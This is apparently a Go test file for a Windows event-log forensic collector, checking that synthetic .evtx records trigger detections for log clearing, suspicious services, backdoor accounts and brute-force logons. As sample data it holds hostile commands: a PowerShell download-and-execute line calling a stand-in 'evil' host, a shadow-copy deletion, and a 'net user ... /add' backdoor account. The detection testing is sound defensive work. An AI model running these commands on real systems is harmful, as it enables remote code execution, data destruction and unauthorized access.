package collector

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// These tests build synthetic events as direct BinXML element trees (the
// normalization in eventlog.go works on the parsed tree regardless of whether
// the record was templated) and assert the normalized fields and findings.

func sysNode(provider string, eventID int, channel string) encNode {
	return encNode{name: "System", children: []encNode{
		{name: "Provider", attrs: []encAttr{litAttr("Name", provider)}},
		{name: "EventID", text: itoa(eventID)},
		{name: "Channel", text: channel},
		{name: "Computer", text: "HOST01"},
	}}
}

func dataNode(pairs ...[2]string) encNode {
	ed := encNode{name: "EventData"}
	for _, p := range pairs {
		ed.children = append(ed.children, encNode{
			name: "Data", attrs: []encAttr{litAttr("Name", p[0])}, text: p[1],
		})
	}
	return ed
}

func eventRecord(t *testing.T, children ...encNode) evtxRecord {
	t.Helper()
	root := encNode{name: "Event", children: children}
	img := buildEvtx(1, ftJan2021, encFragmentAt(recordBase, root))
	recs, warns, err := parseEvtx(img, 0)
	if err != nil || len(recs) != 1 {
		t.Fatalf("build/parse event: err=%v recs=%d warns=%v", err, len(recs), warns)
	}
	return recs[0]
}

func hasFinding(fs []Finding, rule string) *Finding {
	for i := range fs {
		if fs[i].Rule == rule {
			return &fs[i]
		}
	}
	return nil
}

func TestParseEventLogFilesOffline(t *testing.T) {
	dir := t.TempDir()
	root := encNode{name: "Event", children: []encNode{
		sysNode("Microsoft-Windows-Eventlog", 1102, "Security"),
		{name: "UserData", children: []encNode{
			{name: "LogFileCleared", children: []encNode{
				{name: "SubjectUserName", text: "evil"},
			}},
		}},
	}}
	img := buildEvtx(9, ftJun2021, encFragmentAt(recordBase, root))
	path := filepath.Join(dir, "Security.evtx")
	if err := os.WriteFile(path, img, 0o600); err != nil {
		t.Fatal(err)
	}

	res := ParseEventLogFiles(context.Background(), []string{path}, nil)
	if res.Meta["mode"] != "offline" {
		t.Errorf("mode meta = %v, want offline", res.Meta["mode"])
	}
	if res.Meta["logs_read"] != 1 {
		t.Errorf("logs_read = %v, want 1", res.Meta["logs_read"])
	}
	if len(res.Records) != 1 {
		t.Fatalf("records = %d, want 1", len(res.Records))
	}
	if res.Records[0].Fields["source_log"] != "Security.evtx" {
		t.Errorf("source_log = %v", res.Records[0].Fields["source_log"])
	}
	if hasFinding(res.Records[0].Findings, "defense.clear_event_logs") == nil {
		t.Errorf("want defense.clear_event_logs, got %+v", res.Records[0].Findings)
	}

	// A named file that does not exist is an error in offline mode (not the
	// silent "a host simply lacks this channel" of the live sweep).
	res2 := ParseEventLogFiles(context.Background(), []string{filepath.Join(dir, "nope.evtx")}, nil)
	if len(res2.Errors) == 0 {
		t.Error("a missing offline file should be reported as an error")
	}
}

// TestEmitSampleLogs writes a couple of synthetic .evtx files when
// LRNG_SAMPLE_DIR is set, for a manual end-to-end check of `lrng -evtx`. It is
// skipped in a normal run.
func TestEmitSampleLogs(t *testing.T) {
	dir := os.Getenv("LRNG_SAMPLE_DIR")
	if dir == "" {
		t.Skip("set LRNG_SAMPLE_DIR to emit sample .evtx files")
	}
	security := buildEvtx(1, ftJun2021, encFragmentAt(recordBase, encNode{name: "Event", children: []encNode{
		sysNode("Microsoft-Windows-Eventlog", 1102, "Security"),
		{name: "UserData", children: []encNode{
			{name: "LogFileCleared", children: []encNode{{name: "SubjectUserName", text: "attacker"}}},
		}},
	}}))
	system := buildEvtx(1, ftJun2021, encFragmentAt(recordBase, encNode{name: "Event", children: []encNode{
		sysNode("Service Control Manager", 7045, "System"),
		dataNode([2]string{"ServiceName", "Updater"}, [2]string{"ImagePath", `C:\Users\Public\x.exe`}),
	}}))
	// A 4688 whose command line uses a '/'-dash flag variant — exercises the
	// windash builtin rule through the real binary.
	proc := buildEvtx(1, ftJun2021, encFragmentAt(recordBase, encNode{name: "Event", children: []encNode{
		sysNode("Microsoft-Windows-Security-Auditing", 4688, "Security"),
		dataNode(
			[2]string{"NewProcessName", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
			[2]string{"CommandLine", `powershell.exe /w hidden -ep bypass -c IEX(...)`},
		),
	}}))
	for name, data := range map[string][]byte{"Security.evtx": security, "System.evtx": system, "ProcCreate.evtx": proc} {
		if err := os.WriteFile(filepath.Join(dir, name), data, 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// A burst of failed logons from one source, as separate single-record files,
	// to exercise the Sigma count() aggregation across a log set.
	burst := filepath.Join(dir, "bruteforce")
	if err := os.MkdirAll(burst, 0o755); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 12; i++ {
		rec := buildEvtx(uint64(i+1), ftJun2021, encFragmentAt(recordBase, encNode{name: "Event", children: []encNode{
			sysNode("Microsoft-Windows-Security-Auditing", 4625, "Security"),
			dataNode([2]string{"TargetUserName", "admin"}, [2]string{"IpAddress", "203.0.113.9"}),
		}}))
		if err := os.WriteFile(filepath.Join(burst, "failed-"+itoa(i)+".evtx"), rec, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	t.Logf("wrote sample logs to %s", dir)
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	if neg {
		b = append([]byte{'-'}, b...)
	}
	return string(b)
}

// TestSigmaMetaNamesSkippedRules loads a rules directory holding one usable rule
// and one the engine must skip, and checks that the eventlog result says which
// rule didn't run and why — not just how many.
func TestSigmaMetaNamesSkippedRules(t *testing.T) {
	dir := t.TempDir()
	ok := "title: Usable Rule\ndetection:\n    selection:\n        EventID: 7045\n    condition: selection\nlevel: low\n"
	skip := "title: Plain Base64 Rule\ndetection:\n    selection:\n        CommandLine|base64: 'whoami'\n    condition: selection\nlevel: high\n"
	for name, body := range map[string]string{"ok.yml": ok, "skip.yml": skip} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	rs, err := LoadSigmaSpec(dir)
	if err != nil {
		t.Fatal(err)
	}
	res := ParseEventLogFiles(context.Background(), nil, rs)
	m, _ := res.Meta["sigma"].(map[string]any)
	if m == nil || m["rules_loaded"] != 1 || m["rules_skipped"] != 1 {
		t.Fatalf("meta.sigma = %+v", m)
	}
	skipped, _ := m["skipped"].([]string)
	if len(skipped) != 1 || !strings.Contains(skipped[0], "Plain Base64 Rule") || !strings.Contains(skipped[0], "base64") {
		t.Fatalf("meta.sigma.skipped should name the rule and the reason: %q", skipped)
	}
	if _, has := m["failed"]; has {
		t.Errorf("no file failed to parse, but meta.sigma.failed = %v", m["failed"])
	}

	// Failures are listed too, and long lists are bounded.
	many := make([]string, sigmaMetaListMax+5)
	for i := range many {
		many[i] = "r: unsupported"
	}
	m = sigmaMeta(&SigmaRuleset{Skipped: many, Failed: []string{"broken.yml: bad indentation"}})
	if got := m["failed"].([]string); len(got) != 1 || got[0] != "broken.yml: bad indentation" {
		t.Errorf("meta.sigma.failed = %q", got)
	}
	got := m["skipped"].([]string)
	if len(got) != sigmaMetaListMax+1 || got[sigmaMetaListMax] != "… and 5 more" || m["rules_skipped"] != sigmaMetaListMax+5 {
		t.Errorf("bounded skipped list: len %d, tail %q, count %v", len(got), got[len(got)-1], m["rules_skipped"])
	}
}

func TestEventSecurityLogCleared(t *testing.T) {
	rec := eventRecord(t,
		sysNode("Microsoft-Windows-Eventlog", 1102, "Security"),
		encNode{name: "UserData", children: []encNode{
			{name: "LogFileCleared", children: []encNode{
				{name: "SubjectUserName", text: "evil"},
				{name: "SubjectDomainName", text: "CORP"},
			}},
		}},
	)
	fields, findings, keep := classifyEvent("Security", rec)
	if !keep {
		t.Fatal("1102 should always be recorded")
	}
	if fields["event_id"] != 1102 {
		t.Errorf("event_id = %v", fields["event_id"])
	}
	f := hasFinding(findings, "defense.clear_event_logs")
	if f == nil || f.Severity != SevCritical {
		t.Fatalf("want critical defense.clear_event_logs, got %+v", findings)
	}
	if want := "by CORP\\evil"; !strings.Contains(f.Detail, want) {
		t.Errorf("detail %q missing %q", f.Detail, want)
	}
}

func TestEventServiceInstalledUnusualPath(t *testing.T) {
	rec := eventRecord(t,
		sysNode("Service Control Manager", 7045, "System"),
		dataNode(
			[2]string{"ServiceName", "Updater"},
			[2]string{"ImagePath", `C:\Users\Public\x.exe`},
			[2]string{"StartType", "auto start"},
		),
	)
	_, findings, keep := classifyEvent("System", rec)
	if !keep {
		t.Fatal("7045 should be recorded")
	}
	f := hasFinding(findings, "eventlog.service_installed")
	if f == nil || f.Severity != SevSuspect || f.Technique != "T1543.003" {
		t.Fatalf("want suspect service_installed (T1543.003), got %+v", findings)
	}
	if !strings.Contains(f.Detail, "Public") {
		t.Errorf("detail should name the unusual path: %q", f.Detail)
	}
}

func TestEventServiceInstalledRunsCommandAnalytics(t *testing.T) {
	// A service whose ImagePath runs a recovery-inhibition command: the shared
	// command-line analytics should fire alongside the service-installed rule.
	rec := eventRecord(t,
		sysNode("Service Control Manager", 7045, "System"),
		dataNode(
			[2]string{"ServiceName", "x"},
			[2]string{"ImagePath", `C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet`},
		),
	)
	_, findings, _ := classifyEvent("System", rec)
	if hasFinding(findings, "eventlog.service_installed") == nil {
		t.Error("missing service_installed")
	}
	if f := hasFinding(findings, "impact.inhibit_recovery"); f == nil || f.Severity != SevCritical {
		t.Fatalf("command analytics should flag shadow-copy deletion, got %+v", findings)
	}
}

func TestEventAccountCreated(t *testing.T) {
	rec := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4720, "Security"),
		dataNode(
			[2]string{"TargetUserName", "backdoor"},
			[2]string{"SubjectUserName", "admin"},
		),
	)
	_, findings, keep := classifyEvent("Security", rec)
	if !keep {
		t.Fatal("4720 should be recorded")
	}
	f := hasFinding(findings, "persistence.account_created")
	if f == nil || f.Severity != SevSuspect {
		t.Fatalf("want suspect account_created, got %+v", findings)
	}
	if !strings.Contains(f.Detail, "backdoor") {
		t.Errorf("detail should name the account: %q", f.Detail)
	}
}

func TestEventPrivilegedGroupAdd(t *testing.T) {
	priv := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4732, "Security"),
		dataNode(
			[2]string{"TargetUserName", "Administrators"},
			[2]string{"TargetSid", "S-1-5-32-544"},
			[2]string{"MemberName", `CORP\evil`},
			[2]string{"SubjectUserName", "admin"},
		),
	)
	_, findings, _ := classifyEvent("Security", priv)
	if f := hasFinding(findings, "persistence.admin_group_add"); f == nil || f.Severity != SevSuspect {
		t.Fatalf("want suspect admin_group_add, got %+v", findings)
	}

	// Adding to a non-privileged group raises nothing (but is still recorded).
	plain := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4732, "Security"),
		dataNode(
			[2]string{"TargetUserName", "Users"},
			[2]string{"TargetSid", "S-1-5-32-545"},
			[2]string{"MemberName", `CORP\bob`},
		),
	)
	_, findings, keep := classifyEvent("Security", plain)
	if !keep {
		t.Error("4732 should be recorded even without a finding")
	}
	if hasFinding(findings, "persistence.admin_group_add") != nil {
		t.Errorf("non-privileged group add should not fire: %+v", findings)
	}
}

func TestEventScriptBlock(t *testing.T) {
	mal := eventRecord(t,
		sysNode("Microsoft-Windows-PowerShell", 4104, "Microsoft-Windows-PowerShell/Operational"),
		dataNode([2]string{"ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')"}),
	)
	_, findings, keep := classifyEvent("PowerShell", mal)
	if !keep || len(findings) == 0 {
		t.Fatalf("malicious script block should be recorded with findings, got keep=%v %+v", keep, findings)
	}
	if hasFinding(findings, "exec.download_execute") == nil {
		t.Errorf("want exec.download_execute among %+v", findings)
	}

	benign := eventRecord(t,
		sysNode("Microsoft-Windows-PowerShell", 4104, "Microsoft-Windows-PowerShell/Operational"),
		dataNode([2]string{"ScriptBlockText", "Get-ChildItem C:\\Users"}),
	)
	_, findings, keep = classifyEvent("PowerShell", benign)
	if keep || len(findings) != 0 {
		t.Errorf("benign script block should be dropped, got keep=%v %+v", keep, findings)
	}
}

func TestEventProcessCreate(t *testing.T) {
	mal := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4688, "Security"),
		dataNode(
			[2]string{"NewProcessName", `C:\Windows\System32\net.exe`},
			[2]string{"CommandLine", `net user hacker P@ssw0rd /add`},
		),
	)
	_, findings, keep := classifyEvent("Security", mal)
	if !keep || hasFinding(findings, "persistence.account_created") == nil {
		t.Fatalf("4688 with net user /add should fire account_created, got keep=%v %+v", keep, findings)
	}

	// 4688 without command-line auditing: nothing to analyze, so dropped.
	noCmd := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4688, "Security"),
		dataNode([2]string{"NewProcessName", `C:\Windows\System32\notepad.exe`}),
	)
	if _, _, keep := classifyEvent("Security", noCmd); keep {
		t.Error("4688 without a command line should be dropped")
	}
}

func TestEventRemoteLogons(t *testing.T) {
	// RDP (type 10) from a public address → suspect.
	ext := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4624, "Security"),
		dataNode(
			[2]string{"LogonType", "10"},
			[2]string{"TargetUserName", "administrator"},
			[2]string{"TargetDomainName", "CORP"},
			[2]string{"IpAddress", "203.0.113.7"},
		),
	)
	_, findings, keep := classifyEvent("Security", ext)
	if !keep {
		t.Fatal("an RDP logon should be recorded")
	}
	f := hasFinding(findings, "logon.remote_interactive")
	if f == nil || f.Severity != SevSuspect || f.Technique != "T1021.001" {
		t.Fatalf("want suspect logon.remote_interactive (T1021.001), got %+v", findings)
	}
	if !strings.Contains(f.Detail, `CORP\administrator`) || !strings.Contains(f.Detail, "203.0.113.7") {
		t.Errorf("detail should name user and source: %q", f.Detail)
	}

	// RDP from an internal address → kept, but only notable.
	intl := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4624, "Security"),
		dataNode([2]string{"LogonType", "10"}, [2]string{"TargetUserName", "bob"}, [2]string{"IpAddress", "10.0.0.5"}),
	)
	_, findings, keep = classifyEvent("Security", intl)
	if !keep {
		t.Fatal("internal RDP logon should still be recorded")
	}
	if f := hasFinding(findings, "logon.remote_interactive"); f == nil || f.Severity != SevNotable {
		t.Errorf("internal RDP should be notable, got %+v", findings)
	}

	// A plain interactive logon (type 2) is not kept.
	interactive := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4624, "Security"),
		dataNode([2]string{"LogonType", "2"}, [2]string{"TargetUserName", "bob"}),
	)
	if _, _, keep := classifyEvent("Security", interactive); keep {
		t.Error("a type-2 interactive logon should be dropped")
	}
}

func TestEventFailedLogonExternal(t *testing.T) {
	ext := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4625, "Security"),
		dataNode([2]string{"TargetUserName", "admin"}, [2]string{"IpAddress", "198.51.100.9"}),
	)
	_, findings, keep := classifyEvent("Security", ext)
	if !keep || hasFinding(findings, "logon.failed_external") == nil {
		t.Fatalf("external failed logon should fire logon.failed_external, got keep=%v %+v", keep, findings)
	}

	// A failed logon from an internal address is dropped (too noisy to keep).
	intl := eventRecord(t,
		sysNode("Microsoft-Windows-Security-Auditing", 4625, "Security"),
		dataNode([2]string{"TargetUserName", "admin"}, [2]string{"IpAddress", "192.168.1.20"}),
	)
	if _, _, keep := classifyEvent("Security", intl); keep {
		t.Error("an internal failed logon should be dropped")
	}
}

func TestEventDefenderDetection(t *testing.T) {
	rec := eventRecord(t,
		sysNode("Microsoft-Windows-Windows Defender", 1116, "Microsoft-Windows-Windows Defender/Operational"),
		dataNode(
			[2]string{"Threat Name", "Trojan:Win32/Casdet!rfn"},
			[2]string{"Path", `C:\Users\a\AppData\Local\Temp\evil.exe`},
		),
	)
	_, findings, keep := classifyEvent("Defender", rec)
	if !keep {
		t.Fatal("Defender detection should be recorded")
	}
	f := hasFinding(findings, "eventlog.defender_detection")
	if f == nil || f.Severity != SevSuspect {
		t.Fatalf("want suspect defender_detection, got %+v", findings)
	}
	if !strings.Contains(f.Detail, "Trojan:Win32/Casdet!rfn") {
		t.Errorf("detail should name the threat: %q", f.Detail)
	}
}
